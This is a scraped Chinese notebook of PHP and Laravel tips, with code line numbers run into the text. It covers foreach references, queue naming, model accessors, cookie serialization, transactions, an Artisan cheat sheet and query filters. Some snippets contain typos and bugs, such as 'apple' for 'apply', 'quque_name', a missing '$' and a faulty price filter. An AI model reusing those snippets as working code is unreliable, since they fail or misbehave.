语言功能的使用等）。 因为所有的努力都转移到了 PhpSpreadsheet，所以不再维护 PHPExcel。PHPExcel，补丁和新功能的所有贡献都应该以 PhpSpreadsheet master 分支为目标。 foreach1234567891011121314151617181920$data=array('a','b','c'); foreach($data as $key=&gt;$value)&#123; $value=&amp;$data[$key]; &#125;问题1:程序执行时，每一次循环结束后变量$data的值是什么？请解释。问题2:程序执行完后，变量$data的值是什么？请解释。//第一次遍历 结果还是 【a,b,c】//第二次遍历$data[0]='a';//第一次遍历的时候$data[0]=a$val=&amp;$data[0];//这边已经把$data[0]引用指向$val 第一次遍历以后$val=b //现在$val 一旦变了 那么$data[0]也就改变了 所以变成$data[0]=b$data=[b,b,c];//最后结果变成了//第三次遍历$data[1]=b;//第二次遍历的时候$data[1]变成了b$val=&amp;$data[1];//第二次遍历的时候$val的引用变成了$data[1]$val=c;//所以这边$val变成了c 那么$data[1]也就变成了c$data=['b','c','c']//最后结果变成了//最后的$data的结果https://learnku.com/articles/26374【b,c,c】list($b, $a) = array($a, $b); tap123456789101112131415161718192021222324252627282930313233343536$items = [ ['name' =&gt; 'David Charleston', 'member' =&gt; 1, 'active' =&gt; 1], ['name' =&gt; 'Blain Charleston', 'member' =&gt; 0, 'active' =&gt; 0], ['name' =&gt; 'Megan Tarash', 'member' =&gt; 1, 'active' =&gt; 1], ['name' =&gt; 'Jonathan Phaedrus', 'member' =&gt; 1, 'active' =&gt; 1], ['name' =&gt; 'Paul Jackson', 'member' =&gt; 0, 'active' =&gt; 1]];先将数组转为集合，再进行数据的过滤，最后在两个不同的节点调用 tap 方法，返回打印结果：return collect($items) -&gt;where('active', 1) -&gt;tap(function($collection)&#123; return var_dump($collection-&gt;pluck('name')); &#125;) -&gt;where('member', 1) -&gt;tap(function($collection)&#123; return var_dump($collection-&gt;pluck('name')); &#125;);第一次调用 tap 方法输出结果：https://learnku.com/laravel/t/26361David Charleston, Megan Tarash, Jonathan Phaedrus, Paul Jackson第二次调用 tap 方法输出结果：David Charleston, Megan Tarash, Jonathan PhaedrusTap vs PipeLaravel 也提供了另一个类似 tap 的集合操作方法 -- pipe，两者在集合调用上很类似，却有一个主要的区别：通过调用 tap 方法不会改变原集合的结果，而 pipe 方法会根据返回值修改元集合的结果。示例如下：return collect($items) -&gt;where('active', 1) -&gt;pipe(function ($collection) &#123; return $collection-&gt;push(['name' =&gt; 'John Doe']); &#125;);// David Charleston, Megan Tarash, Jonathan Phaedrus, Paul Jackson, John Doe artisan日志 root 权限解决12345678910111213bootstrap/app.php 中写入以下配置： https://learnku.com/articles/26444$app-&gt;configureMonologUsing(function(Monolog\Logger $monolog) &#123; $filename = storage_path('logs/laravel-'.php_sapi_name().'.log'); $handler = new Monolog\Handler\RotatingFileHandler($filename); $monolog-&gt;pushHandler($handler);&#125;);正确的做法应该是用 www 用户执行 artisan 命令，因为不光是日志，还有可能有缓存、 storage 等文件可能被 root 用户创建而导致 www 用户无权操作。脚本写在 crontab 中的，如果我想用 www 用户执行 artisan 命令，我应该怎么写 crontab 呢 crontab -e -u wwwphp cli 或者 fpm 都是用 www 用户去执行 就不会出现你这个问题的不想使用单独的用户配置 crontab，也可以这么干，比如：配置在 root 账号下su www -s /bin/bash -c “php artisan schedule:run” 英文字符占 0.5 个，中文字符占 1 个12345678910111213141516171819202122232425https://learnku.com/articles/4956/following-my-unique-needs-of-the-english-characters-accounted-for-05-chinese-characters-accounted-for-1#topnav$double = str_word_count(preg_replace('([a-zA-Z0-9_])', '', $value)); // 计算单字节. preg_match_all('/[a-zA-Z0-9_]/', $value, $single); $single = count($single[0]) / 2; // 多子节长度. $double = mb_strlen(preg_replace('([a-zA-Z0-9_])', '', $value));function the_fucking_length_function($str)&#123; return strlen(mb_convert_encoding($str, 'GB2312')) / 2;&#125;$length = (strlen($value) + mb_strlen($value)) / 2;//这个方法是好的，缺点就只有一个，就是精度问题，因为 utf-8 中只有两万多个汉字是 3 字节，还有六万多的不常用汉字是 4 字节的，附带 emoji 之类的就 function mbstrlen($str) &#123; return ceil((strlen($str) + mb_strlen($str, "UTF8")) / 2);&#125;function str_display_len (string $str)&#123; preg_match_all('/[a-zA-Z0-9_]/', $str, $single); return count($single[0]) / 2 + mb_strlen(preg_replace('([a-zA-Z0-9_])', '', $str));&#125;https://www.php.net/manual/zh/function.mb-strwidth.php bas64简历1https://learnku.com/laravel/t/25907 PHP 排名算法支持重复排名123456789101112131415161718192021222324252627282930313233343536373839404142434445//https://learnku.com/articles/26769$arr = [ [ 'id'=&gt;1, 'score'=&gt;10, ], [ 'id'=&gt;2, 'score'=&gt;30, ], [ 'id'=&gt;3, 'score'=&gt;50, ], [ 'id'=&gt;4, 'score'=&gt;50, ]]你想从小到大，取出前三名，如果第四名和第三名也相同，也取出来先按 score 排序array_multisort(array_column($arr,'score'),SORT_ASC,$arr);前三名 $results = array_slice($arr, 0, 3, true);然后前三名的最后一名和之后的比较$length = count($arr);$resultLength = count($results);//$resultLength 比 $length小说明$arr 的还有元素，否则它们俩就相等了。然后比较key和key+1的值。极限是所有的人都和第三名相同，自行判断是否需要所有人都胜出，来限制 $resultLength 的长度while($resultLength&lt;$length &amp;&amp;$results[$resultLength-1]['score']==$arr[$resultLength]['score'])&#123; array_push($results,$arr[$resultLength]); $resultLength = count($results); &#125;最后如果要判断某一用户是否胜出$ifWinner = 0;if(in_array($id,array_column($results,'id')))&#123; $ifWinner = 1;&#125; 多个 Laravel 应用 queue 队列执行时会互串123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105app/Libriries/helper.php ，可以写在你任何想放的地方 /** * 多个 laravel 项目，如果 --queue 相同会互串 * 这里统一加个当前项目名的前缀来区分 * @param $name * @return string */function queue_name($name)&#123; $name_trans = []; foreach(explode(',',$name) as $k =&gt; $v)&#123; $name_trans[] = str_slug(config('app.name') . ' ' . $v, '_'); &#125; return implode(',',$name_trans);&#125;修改每个 Job 的 $queue 添加 queue_name ()namespace App\Jobs;// 省略...class ApiBehavior implements ShouldQueue&#123; use Dispatchable, InteractsWithQueue, Queueable, SerializesModels; public function __construct() &#123; // 添加这一行 $this-&gt;queue = queue_name('你的队列名'); &#125;&#125;// 分发队列时，照常分发即可ApiBehavior::dispatch()// 或者这种分发时指定，可以省略第二步。ApiBehavior::dispatch()-&gt;onQueue(quque_name('你的队列名'))新建监听队列命令，包装一层 quque:work，以使用自定义队列名&lt;?phpnamespace App\Console\Commands;use Illuminate\Console\Command;class QueueWorkListen extends Command&#123; /** * The name and signature of the console command. * * @var string */ protected $signature = 'queue:work-listen &#123;connection? : The name of the queue connection to work&#125; &#123;--queue= : The names of the queues to work&#125; &#123;--daemon : Run the worker in daemon mode (Deprecated)&#125; &#123;--once : Only process the next job on the queue&#125; &#123;--delay=0 : The number of seconds to delay failed jobs&#125; &#123;--force : Force the worker to run even in maintenance mode&#125; &#123;--memory=128 : The memory limit in megabytes&#125; &#123;--sleep=3 : Number of seconds to sleep when no job is available&#125; &#123;--timeout=60 : The number of seconds a child process can run&#125; &#123;--tries=0 : Number of times to attempt a job before logging it failed&#125;'; /** * The console command description. * * @var string */ protected $description = 'Start processing jobs on the queue as a daemon'; /** * Create a new command instance. * * @return void */ public function __construct() &#123; parent::__construct(); &#125; /** * Execute the console command. * * @return mixed */ public function handle() &#123; $this-&gt;call('queue:work',[ 'connection'=&gt; $this-&gt;argument('connection'), '--queue' =&gt; queue_name($this-&gt;option('queue') ?: 'default'), '--daemon' =&gt; $this-&gt;option('daemon'), '--once' =&gt; $this-&gt;option('once'), '--delay' =&gt; $this-&gt;option('delay'), '--force' =&gt; $this-&gt;option('force'), '--memory' =&gt; $this-&gt;option('memory'), '--sleep' =&gt; $this-&gt;option('sleep'), '--timeout' =&gt; $this-&gt;option('timeout'), '--tries' =&gt; $this-&gt;option('tries'), ]); &#125;&#125;5、使用自定义命令监听队列，其他参数与 queue:work 一样使用https://learnku.com/articles/19460php /var/www/ebank/artisan queue:work-listen --queue=email --sleep=3// or 多个php /var/www/ebank/artisan queue:work-listen --queue=email,test,test2,test3 --sleep=3redis配置不同库就可以 修改器123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100&lt;?phpnamespace App\Models;use Illuminate\Database\Eloquent\Model;use Carbon\Carbon;class Baby extends Model&#123; protected $table = 'baby'; protected $appends = ['age']; public function getAgeAttribute() &#123; $date = new Carbon($this-&gt;birthday); return Carbon::now()-&gt;diffInYears($date); &#125;&#125;这个代码比较简单，就是通过已有属性 birthday，计算 Baby 几岁了，得到 age 属性。前端就可以直接拿到结果：https://learnku.com/articles/21982#topnavreturn $baby-&gt;age;class User extends Model &#123;/** * 更改为日期类型的属性 * * @var array */ protected $dates = [ 'created_at', 'updated_at', 'expires_at', 'gets_mad_at' ]; /** * 我们检索时始终将名字大写 */ public function getFirstNameAttribute($value) &#123; return ucfirst($value); &#125; /** * 我们检索时始终将姓氏大写 */ public function getLastNameAttribute($value) &#123; return ucfirst($value); &#125; /** * 将名称保存到数据库时，始终将名字大写 */ public function setFirstNameAttribute($value) &#123; $this-&gt;attributes['first_name'] = ucfirst($value); &#125; /** * 将名称保存到数据库时，始终将姓氏大写 */ public function setLastNameAttribute($value) &#123; $this-&gt;attributes['last_name'] = ucfirst($value); &#125; /** * 我们将密码保存至数据库时，总是哈希后保存。 */ public function setPasswordAttribute($value) &#123; $this-&gt;attributes['password'] = Hash::make($value); &#125; /** * 总是 json_decode settings字段，所以它们是可用的 */ public function getSettingsAttribute($value) &#123; return json_decode($value); // 你可以确保同时返回一个数组 // return json_decode($value, true); &#125; /** * 保存到数据库时，总是对 settings 字段进行 json_encode * Always json_encode the settings when saving to the database */ public function setSettingsAttribute($value) &#123; $this-&gt;attributes['settings'] = json_encode($value); &#125;&#125;// 获取 awesomedudette 用户 https://learnku.com/laravel/t/27551$user = App\User::where('username', 'awesomedudette')-&gt;first();// 查找此用户的过期时间前一小时$explodeWarning = $user-&gt;explodes_at-&gt;subHour();$user = App\User::create([ 'first_name' =&gt; 'chris', 'last_name' =&gt; 'sevilleja', 'email' =&gt; 'chris&amp;64;scotch.io', 'password' =&gt; 'password', 'expires_at' =&gt; Carbon::now()-&gt;addMonth(), 'explodes_at' =&gt; Carbon::now()-&gt;addDay(), 'gets_mad_at' =&gt; Carbon::yesterday()]); 响应宏原理123456789101112131415161718192021222324252627Response::macro('success', function ($data = [], $message = 'success') &#123; return new JsonResponse([ 'code' =&gt; 0, 'data' =&gt; $data, 'message' =&gt; $message ], 200);&#125;);接下来， 你可以再任何地方使用它response()。https://godruoyi.com/posts/laravel-response-macro-principle//UserController.phppublic function users(UserRepository $userRepository)&#123; return response()-&gt;success($userRepository-&gt;all(), 'success');&#125;注意，你只能通过response()这个全局方法或是app('Illuminate\Routing\ResponseFactory')来使用它response()-&gt;success();//OKapp('Illuminate\Routing\ResponseFactory')-&gt;success();//OK//Response FacadeResponse::success();//ok(new \Illuminate\Http\Response)-&gt;success();//Error每一次请求结束，PHP 的变量都会 unset，Laravel 的 singleton 只是在某一次请求过程中的singleton；你在 Laravel 中的静态变量也不能在多个请求之间共享，因为每一次请求结束都会 unset。理解这些概念，是写高质量代码的第一步，也是最关键的一步。因此记住，PHP是一种脚本语言，所有的变量只会在这一次请求中生效，下次请求之时已被重置，而不像Java静态变量拥有全局作用。 队列优先级的一个坑12345678910111213141516171819202122232425php artisan queue:work --queue=high,low这样，当我们的任务需要优先发送时，就可以通过指定队列名high来优先发送。dispatch((new Job)-&gt;onQueue('high'));但是当你后续任务没有指定队列名（high、low）时，你的队列任务永远也不会执行。（比如我们在发送消息通知时）&lt;?phpnamespace App\Notifications;use Illuminate\Bus\Queueable;use Illuminate\Notifications\Notification;use Illuminate\Contracts\Queue\ShouldQueue;class YourNotification extends Notification implements ShouldQueue&#123; use Queueable;&#125;你发现即使你按照文档说的，implements ShouldQueue并且use Queueable，该通知还是无法加入队列。那是因为config\queuq.php配置中，指定了默认的队列名为default，所以所有的队列任务，如果没指定队列名时，默认是default。但是我们在启动队列进程时，只指定了high和low。当然不会生效。https://godruoyi.com/posts/a-pit-in-the-laravel-queue-priority解决办法： 1、修改config\queuq.php默认队列名为low或high 2、启动队列进程时添加default（--queue=high,default,low） 合成图片12345678910111213141516171819202122232425262728293031323334require 'vendor/autoload.php';use Intervention\Image\ImageManager;$manager = new ImageManager(array('driver' =&gt; 'imagick'));如果是在 Laravel 中，可直接通过 app('image') 或使用 Intervention\Image\Facades\Image 门面类。use Intervention\Image\Facades\Image;//或$manager = app('image');合成// $image = $manager-&gt;make($bg);// $image = Image::make($bg);$image = app('image')-&gt;make($bg);// 二维码图片https://godruoyi.com/posts/intervention-image-was-used-to-synthesize-images$qrcodeImage = app('image')-&gt;make($qrcodeurl)-&gt;resize(200, 200);// 重置 头像 大小$avatarImage = app('image')-&gt;make($httpClient-&gt;request('GET', $avatarurl)-&gt;getBody())-&gt;resize(200, 200);$image-&gt;text('Nickname', 376, 320, function ($font) &#123; $font-&gt;file(public_path('fonts/SimHei.ttf')); $font-&gt;size(40); $font-&gt;color('#000000'); $font-&gt;align('center'); $font-&gt;valign('top');&#125;);$image-&gt;insert($qrcodeImage, 'bottom', 0, 360);$image-&gt;insert($avatarImage, 'top', 0, 105); http code 20412345204 为成功状态响应码，表示目前请求成功，但客户端不需要更新其现有页面。204 响应默认是可以被缓存的。在响应中需要包含头信息 ETag。使用惯例是，在 PUT 请求中进行资源更新，但是不需要改变当前展示给用户的页面，那么返回 204 No Content。如果新创建了资源，那么返回 201 Created 。如果页面需要更新以反映更新后的资源，那么需要返回 200 。所以大家在做 RestFul API 接口是，store、update 什么的，别全 200 200 的返回了，不正规。https://learnku.com/articles/28056 json_encode 中文1234567891011121314151617181920public/index.php$response = $kernel-&gt;handle( $request = Illuminate\Http\Request::capture());// 取到内容https://learnku.com/articles/28054#topnav$content = $response-&gt;original;// 检查原始内容的类型是否需要转 jsonif ($content instanceof Arrayable || $content instanceof Jsonable || $content instanceof ArrayObject || $content instanceof JsonSerializable || is_array($content)) &#123; // 重新设置响应内容 $response-&gt;setContent(json_encode($content, JSON_UNESCAPED_UNICODE));&#125;$response-&gt;send(); 升级至Laravel 5.7报错setTrustedProxies() must be of the type integer123456789101112131415打开 App\Http\Middleware\TrustProxies 将代码：http://www.ithov.net/php/1644.html protected $headers = [ Request::HEADER_FORWARDED =&gt; 'FORWARDED', Request::HEADER_X_FORWARDED_FOR =&gt; 'X_FORWARDED_FOR', Request::HEADER_X_FORWARDED_HOST =&gt; 'X_FORWARDED_HOST', Request::HEADER_X_FORWARDED_PORT =&gt; 'X_FORWARDED_PORT', Request::HEADER_X_FORWARDED_PROTO =&gt; 'X_FORWARDED_PROTO', ]; 修改为： protected $headers = Request::HEADER_X_FORWARDED_ALL; openssl_encrypt() expects parameter 1 to be string12345678910111213141516175.5 升级到 5.5.42 后遇到的 Cookie 序列化问题Laravel 新版为了防止 PHP 对象的序列化/反序列化漏洞被利用，不再对 Cookie 值进行自动的序列化和反序列化处理。\Cookie::queue('user', ['id' =&gt; 1, 'name' =&gt; 'admin'], 720, '/')Laravel 更新到 v5.5.42 后，因为 Laravel 不再自动对 Cookie 值 ['id' =&gt; 1, 'name' =&gt; 'admin'] 进行序列化处理，而 openssl_encrypt ( string $data ... ) 只能加密字符串数据，这个时候程序就会抛出错误：openssl_encrypt() expects parameter 1 to be string, array given。解决方法：https://segmentfault.com/a/1190000018799611新版里面在中间件 AppHttpMiddlewareEncryptCookies 新增静态属性 $serialize，当设置为 true 时可开启 Cookie 值的自动序列化和反序列化处理。/** * Indicates if cookies should be serialized. * * @var bool */protected static $serialize = true;【推荐】将 Cookie 值使用 JSON 函数编码成字符串后再进行存储（获取 Cookie 值后需调用 JSON 函数进行解码）。\Cookie::queue('user', json_encode(['id' =&gt; 1, 'name' =&gt; 'admin']), 720, '/'); 多库下的DB::transaction()事务失效1234567891011121314151617181920212223242526272829303132333435363738394041DB::transaction(function () use ($uid, $roleId) &#123; RoomUserRole::insert([ 'uid' =&gt; $uid, 'role_id' =&gt; $roleId, 'created_at' =&gt; LARAVEL_START, 'updated_at' =&gt; LARAVEL_START ]); RoomUserRoleLog::insert([ 'uid' =&gt; $uid, 'handle_type' =&gt; 1, 'admin_uid' =&gt; Auth::user()-&gt;id, 'created_at' =&gt; LARAVEL_START, 'updated_at' =&gt; LARAVEL_START ]);&#125;);mysql 第二句会报错抛出一个异常， 查看数据库时第一句依然出入成功原文：https://blog.csdn.net/mathphp/article/details/82593779 DB::transaction()使用的是默认库的事务操作。所以要指定哪个数据库的事务DB::connection('mysql2')-&gt;transaction(function () use ($uid, $roleId) &#123; RoomUserRole::insert([ 'uid' =&gt; $uid, 'role_id' =&gt; $roleId, 'created_at' =&gt; LARAVEL_START, 'updated_at' =&gt; LARAVEL_START ]); RoomUserRoleLog::insert([ 'uid' =&gt; $uid, 'handle_type' =&gt; 1, 'admin_uid' =&gt; Auth::user()-&gt;id, 'created_at' =&gt; LARAVEL_START, 'updated_at' =&gt; LARAVEL_START ]);&#125;); // 这样你会发现事务才正常回滚DB::connection('mysql_chat_room')-&gt;beginTransaction();DB::connection('mysql_chat_room')-&gt;commit();DB::connection('mysql_chat_room')-&gt;rollBack(); // 指定库，不然都会跑默认配置库的事务 执行时间和内存消耗123456789101112131415function getElapsedTime(int $decimals = 2)&#123; return number_format(microtime(true) - request()-&gt;server('REQUEST_TIME_FLOAT'), $decimals) . ' s';&#125;内存使用：function getMemoryUsage(precision = 2)&#123; $size = memory_get_usage(true); $unit = ['b', 'kb', 'mb', 'gb', 'tb', 'pb']; return round($size / pow(1024, ($i = floor(log($size, 1024)))), $precision) . ' ' . $unit[$i];&#125; 速查表123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250// 针对命令显示帮助信息php artisan --help OR -h// 抑制输出信息php artisan --quiet OR -q// 打印 Laravel 的版本信息php artisan --version OR -V// 不询问任何交互性的问题php artisan --no-interaction OR -n// 强制输出 ANSI 格式php artisan --ansi// 禁止输出 ANSI 格式php artisan --no-ansi// 显示当前命令行运行的环境php artisan --env// -v|vv|vvv 通过增加 v 的个数来控制命令行输出内容的详尽情况: 1 个代表正常输出, 2 个代表输出更多消息, 3 个代表调试php artisan --verbose// 移除编译优化过的文件 (storage/frameworks/compiled.php)php artisan clear-compiled// 显示当前框架运行的环境php artisan env// 显示某个命令的帮助信息php artisan help// 显示所有可用的命令php artisan list// 进入应用交互模式php artisan tinker// 配合 dump() 函数调试数据php artisan dump-server// 进入维护模式php artisan down// 退出维护模式php artisan up// 优化框架性能// --force 强制编译已写入文件 (storage/frameworks/compiled.php)// --psr 不对 Composer 的 dump-autoload 进行优化php artisan optimize [--force] [--psr]// 更改前端预设// type_name (可以是 none, bootstrap, vue, react)php artisan preset [options] [--] type_name// 启动内置服务器php artisan serve// 更改默认端口php artisan serve --port 8080// 使其在本地服务器外也可正常工作php artisan serve --host 0.0.0.0// 更改应用命名空间php artisan app:name namespace// 清除过期的密码重置令牌php artisan auth:clear-resets// 清空应用缓存php artisan cache:clear// 移除 key_name 对应的缓存php artisan cache:forget key_name [&lt;store&gt;]// 创建缓存数据库表 migrationphp artisan cache:table// 合并所有的配置信息为一个，提高加载速度php artisan config:cache// 移除配置缓存文件php artisan config:clear// 程序内部调用 Artisan 命令$exitCode = Artisan::call('config:cache');// 运行所有的 seed 假数据生成类// --class 可以指定运行的类，默认是: "DatabaseSeeder"// --database 可以指定数据库// --force 当处于生产环境时强制执行操作php artisan db:seed [--class[="..."]] [--database[="..."]] [--force]// 基于注册的信息，生成遗漏的 events 和 handlersphp artisan event:generate// 罗列所有事件和监听器php artisan event:list// 缓存事件和监听器php artisan event:cache// 清除事件和监听器缓存php artisan event:clear// 生成新的处理器类// --command 需要处理器处理的命令类名字php artisan handler:command [--command="..."] name// 创建一个新的时间处理器类// --event 需要处理器处理的事件类名字// --queued 需要处理器使用队列话处理的事件类名字php artisan handler:event [--event="..."] [--queued] name// 生成应用的 key（会覆盖）php artisan key:generate// 发布本地化翻译文件到 resources 文件下// locales: 逗号分隔，如 zh_CN,tk,th [默认是: "all"]php artisan lang:publish [options] [--] [&lt;locales&gt;]// 创建用户认证脚手架php artisan make:auth// 创建 Channel 类php artisan make:channel name// 在默认情况下, 这将创建未加入队列的自处理命令// 通过 --handler 标识来生成一个处理器, 用 --queued 来使其入队列.php artisan make:command [--handler] [--queued] name// 创建一个新的 Artisan 命令// --command 命令被调用的名称。 (默认为: "command:name")php artisan make:console [--command[="..."]] name// 创建一个新的资源控制器// --plain 生成一个空白的控制器类php artisan make:controller [--plain] namephp artisan make:controller App\\Admin\\Http\\Controllers\\DashboardController// 创建一个新的事件类php artisan make:event name// 创建异常类php artisan make:exception name// 创建模型工厂类php artisan make:factory name// 创建一个队列任务文件php artisan make:job // 创建一个监听者类php artisan make:listener name// 创建一个新的邮件类php artisan make:mail name// 创建一个新的中间件类php artisan make:middleware name// 创建一个新的迁移文件// --create 将被创建的数据表.// --table 将被迁移的数据表.php artisan make:migration [--create[="..."]] [--table[="..."]] name// 创建一个新的 Eloquent 模型类php artisan make:model Userphp artisan make:model Models/User// 新建一个消息通知类php artisan make:notification TopicRepliedNotification// 新建一个模型观察者类php artisan make:observer UserObserver// 创建授权策略php artisan make:policy PostPolicy// 创建一个新的服务提供者类php artisan make:provider name// 创建一个新的表单请求类php artisan make:request name// 创建一个 API 资源类php artisan make:resource name// 新建验证规则类php artisan make:rule name// 创建模型脚手架// &lt;name&gt; 模型名称，如 Post// -s, --schema=SCHEMA 表结构如：--schema="title:string"// -a, --validator[=VALIDATOR] 表单验证，如：--validator="title:required"// -l, --localization[=LOCALIZATION] 设置本地化信息，如：--localization="key:value"// -b, --lang[=LANG] 设置本地化语言 --lang="en"// -f, --form[=FORM] 使用 Illumintate/Html Form 来生成表单选项，默认为 false// -p, --prefix[=PREFIX] 表结构前缀，默认 falsephp artisan make:scaffold [options] [--] &lt;name&gt;// 生成数据填充类php artisan make:seeder// 生成测试类php artisan make:test// 数据库迁移// --database 指定数据库连接（下同）// --force 当处于生产环境时强制执行，不询问（下同）// --path 指定单独迁移文件地址// --pretend 把将要运行的 SQL 语句打印出来（下同）// --seed Seed 任务是否需要被重新运行（下同）php artisan migrate [--database[="..."]] [--force] [--path[="..."]] [--pretend] [--seed]// 创建迁移数据库表php artisan migrate:install [--database[="..."]]// Drop 所有数据表并重新运行 Migrationphp artisan migrate:fresh// 重置并重新运行所有的 migrations// --seeder 指定主 Seeder 的类名php artisan migrate:refresh [--database[="..."]] [--force] [--seed] [--seeder[="..."]]// 回滚所有的数据库迁移php artisan migrate:reset [--database[="..."]] [--force] [--pretend]// 回滚最最近一次运行的迁移任务php artisan migrate:rollback [--database[="..."]] [--force] [--pretend]// migrations 数据库表信息php artisan migrate:status// 为数据库消息通知创建一个表迁移类php artisan notifications:table// 清除缓存的 bootstrap 文件php artisan optimize:clear// 扩展包自动发现php artisan package:discover// 为队列数据库表创建一个新的迁移php artisan queue:table// 监听指定的队列// --queue 被监听的队列// --delay 给执行失败的任务设置延时时间 (默认为零: 0)// --memory 内存限制大小，单位为 MB (默认为: 128)// --timeout 指定任务运行超时秒数 (默认为: 60)// --sleep 等待检查队列任务的秒数 (默认为: 3)// --tries 任务记录失败重试次数 (默认为: 0)php artisan queue:listen [--queue[="..."]] [--delay[="..."]] [--memory[="..."]] [--timeout[="..."]] [--sleep[="..."]] [--tries[="..."]] [connection]// 查看所有执行失败的队列任务php artisan queue:failed// 为执行失败的数据表任务创建一个迁移php artisan queue:failed-table// 清除所有执行失败的队列任务php artisan queue:flush// 删除一个执行失败的队列任务php artisan queue:forget// 在当前的队列任务执行完毕后, 重启队列的守护进程php artisan queue:restart// 对指定 id 的执行失败的队列任务进行重试(id: 失败队列任务的 ID)php artisan queue:retry id// 指定订阅 Iron.io 队列的链接// queue: Iron.io 的队列名称.// url: 将被订阅的 URL.// --type 指定队列的推送类型.php artisan queue:subscribe [--type[="..."]] queue url// 处理下一个队列任务// --queue 被监听的队列// --daemon 在后台模式运行// --delay 给执行失败的任务设置延时时间 (默认为零: 0)// --force 强制在「维护模式下」运行// --memory 内存限制大小，单位为 MB (默认为: 128)// --sleep 当没有任务处于有效状态时, 设置其进入休眠的秒数 (默认为: 3)// --tries 任务记录失败重试次数 (默认为: 0)php artisan queue:work [--queue[="..."]] [--daemon] [--delay[="..."]] [--force] [--memory[="..."]] [--sleep[="..."]] [--tries[="..."]] [connection]// 生成路由缓存文件来提升路由效率php artisan route:cache// 移除路由缓存文件php artisan route:clear// 显示已注册过的路由php artisan route:list// 运行计划命令php artisan schedule:run// 为 session 数据表生成迁移文件php artisan session:table// 创建 "public/storage" 到 "storage/app/public" 的软链接php artisan storage:link// 从 vendor 的扩展包中发布任何可发布的资源// --force 重写所有已存在的文件// --provider 指定你想要发布资源文件的服务提供者// --tag 指定你想要发布标记资源.php artisan vendor:publish [--force] [--provider[="..."]] [--tag[="..."]]php artisan tail [--path[="..."]] [--lines[="..."]] [connection]// 缓存视图文件以提高效率php artisan view:cache// 清除视图文件缓存php artisan view:clearhttps://laravelcode.cn/docs/5.8 Laravel Excel123456789101112131415161718192021222324252627282930313233composer require maatwebsite/excelphp artisan vendor:publish --provider="Maatwebsite\Excel\ExcelServiceProvider"php artisan make:export UsersExport --model=User&lt;?phpnamespace App\Exports;use App\User;use Maatwebsite\Excel\Concerns\FromCollection;class UsersExport implements FromCollection&#123;public function collection()&#123; return User::all();&#125;&#125;控制器中调用use App\Exports\UsersExport;use Maatwebsite\Excel\Facades\Excel;use App\Http\Controllers\Controller;class UsersController extends Controller&#123;public function export()&#123; return Excel::download(new UsersExport, 'users.xlsx');&#125;&#125;https://learnku.com/articles/29089 模型过滤12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576public function index()&#123; return Book::query() -&gt;where('title', 'like', '%我们%') -&gt;where('price', '&gt;=', 30) -&gt;where('publisher', '大地出版社') -&gt;orderBy('id', 'DESC') -&gt;get();&#125;abstract class QueryFilter&#123; protected $request; protected $builder; public function __construct(Request $request) &#123; $this-&gt;request = $request; &#125; public function apply(Builder $builder) &#123; $this-&gt;builder = $builder; foreach ($this-&gt;filters() as $name =&gt; $value) &#123; if (method_exists($this, $name)) &#123; call_user_func_array([$this, $name], array_filter([$value])); &#125; &#125; return $this-&gt;builder; &#125; public function filters() &#123; return $this-&gt;request-&gt;all(); &#125;&#125;class BookFilter extends QueryFilter&#123; public function title($title) &#123; return $this-&gt;builder-&gt;where('title', 'like', "%&#123;$title&#125;%"); &#125; public function price($price) &#123; return $this-&gt;builder-&gt;where('price', '&gt;=', "%&#123;$price&#125;%"); &#125; public function publisher($publisher) &#123; return $this-&gt;builder-&gt;where('publisher', $publisher); &#125;&#125;通过 URL 的参数来进行动态查询。books?title=我们 // 查找标题含有我们的图书books?title=我们&amp;price=25 // 查找标题含有我们并且价格大于25元的图书class Book extends Model&#123; public function scopeFilter($query, QueryFilter $filters) &#123; return $filters-&gt;apple($query); &#125;&#125;最后，我们原来控制器的方法将改为下面的样子：public function index(BookFilter $filters)&#123; return Book::filter($filters)-&gt;get();&#125;https://learnku.com/articles/29100#reply91762 Laravel 配置双模板12345678910111213141516171819202122232425262728293031323334composer require whichbrowser/parserphp artisan make:middleware Templateclass Template&#123; protected $except = []; public function handle($request, Closure $next) &#123; $result = new WhichBrowser\Parser(getallheaders()); // 如果是桌面类型, 返回true $isDesktop = $result-&gt;isType('desktop'); if ($isDesktop) &#123; // 加载pc端的模板文件 $path = resource_path('views/pc/'); &#125; else &#123; // 加载mobile端的模板文件 $path = resource_path('views/mobile/'); &#125; // 获取视图查找器实例 $view = app('view')-&gt;getFinder(); // 重新定义视图目录 $view-&gt;prependLocation($path); // 返回请求 return $next($request); &#125;&#125;protected $middleware = [ \App\Http\Middleware\Template::class,];return view('registration.index', $data);如从 PC 设备打开网页：加载 /resources/views/pc/registration/index.blade.php 模板如从移动设备打开网页：加载 /resources/views/mobile/registration/index.blade.php 模板https://learnku.com/articles/24789 助手函数1234567891011121314php artisan make:provider HelperServiceProviderpublic function register()&#123; foreach(glob(app_path('Helpers') . '/*.php') as $file) &#123; require_once $file; &#125;&#125;App\Providers\HelperServiceProvider::class,function carbon($time = null, $tz = null)&#123; return new \Carbon\Carbon($time, $tz);&#125;https://blog.foof.dev/posts/laravel-elegant-add-helper-function-0 创建无限极分类树123456789101112131415public static function getList($catList)&#123; $treeData = []; foreach ($catList as &amp;$item) &#123; $parent_id = $item['parent_id']; if (isset($catList[$parent_id]) &amp;&amp; !empty($catList[$parent_id])) &#123; $catList[$parent_id]['list'][] = &amp;$catList[$item['id']]; &#125; else &#123; $treeData[] = &amp;$catList[$item['id']]; &#125; &#125; unset($item); return $treeData[0]['list']; // 根节点只有中华人民共和国，所以直接返回中国的所有子节点&#125;https://learnku.com/articles/30088 任务重复执行123456789101112131415161718192021当前任务还没有执行完毕的时候另一个相同的任务也会执行，从而导致任务重复。例如想象一下我们执行每分钟生成一次报告的任务，在经过一段时间后，数据量变得很大导致执行时间多于 1 